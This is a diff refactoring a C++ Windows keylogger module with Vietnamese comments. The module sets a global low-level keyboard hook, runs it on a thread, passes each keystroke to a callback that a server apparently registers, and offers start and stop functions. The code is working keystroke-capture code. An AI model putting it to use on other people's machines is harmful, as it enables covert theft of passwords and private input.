@@ -9,16 +9,11 @@
 // CALLBACK do server đăng kí
 static KeyEventCallback g_callback = nullptr;
 
-void setKeyEventCallback(KeyEventCallback cb)
-{
-    g_callback = cb;
-}
-
 // Cờ hiệu an toàn luồng để ra lệnh dừng
 static std::atomic<bool> g_isKeylogging(false);
 
 // Handle của hook
-static HHOOK g_keyboardHook = NULL;
+static HHOOK g_keyboardHook = nullptr;
 
 // Luồng chạy vòng lặp message
 static std::thread g_loggerThread;
@@ -26,13 +21,12 @@ static std::thread g_loggerThread;
 // ID của luồng để có thể gửi tín hiệu dừng
 static DWORD g_loggerThreadId = 0;
 
-// === HÀM GHI LOG ===
-void logKeystroke(int key)
+// Gửi sự kiện phím
+void logKey(int key)
 {
     // Gửi CALLBACK
     if (g_callback)
         g_callback(key);
-
 }
 
 // === HÀM HOOK CALLBACK ===
@@ -40,33 +34,28 @@ void logKeystroke(int key)
 /**
  * @brief Đây là hàm mà Windows gọi mỗi khi có phím được nhấn.
  */
-LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
+LRESULT CALLBACK keyboardProc(int code, WPARAM wParam, LPARAM lParam)
 {
-    if (nCode == HC_ACTION &&
+    if (code == HC_ACTION &&
         (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
     {
-        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;
-        int key = kb->vkCode;
-
-        // Luôn ghi log cục bộ
-        logKeystroke(key);
-
+        const auto *kb = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
+        logKey(kb->vkCode);
     }
-    return CallNextHookEx(g_keyboardHook, nCode, wParam, lParam);
+    return CallNextHookEx(g_keyboardHook, code, wParam, lParam);
 }
 
 // ===== LUỒNG HOOK =====
-static void hookThread()
+void hookThreadFunc()
 {
     g_loggerThreadId = GetCurrentThreadId();
 
-    HINSTANCE hInst = GetModuleHandle(NULL);
-    g_keyboardHook =
-        SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInst, 0);
+    HINSTANCE hInst = GetModuleHandle(nullptr);
+    g_keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, hInst, 0);
 
     if (!g_keyboardHook)
     {
-        g_isKeylogging.store(false);
+        g_isKeylogging = false;
         return;
     }
 
@@ -80,8 +69,14 @@ static void hookThread()
     }
 
     UnhookWindowsHookEx(g_keyboardHook);
-    g_keyboardHook = NULL;
+    g_keyboardHook = nullptr;
     g_loggerThreadId = 0;
+}
+
+// API Public
+void setKeyEventCallback(KeyEventCallback cb)
+{
+    g_callback = cb;
 }
 
 // ===== START / STOP =====
@@ -89,9 +84,10 @@ void startKeylogger()
 {
     if (g_isKeylogging.load())
         return;
+
     g_isKeylogging.store(true);
 
-    g_loggerThread = std::thread(hookThread);
+    g_loggerThread = std::thread(hookThreadFunc);
 }
 
 void stopKeylogger()
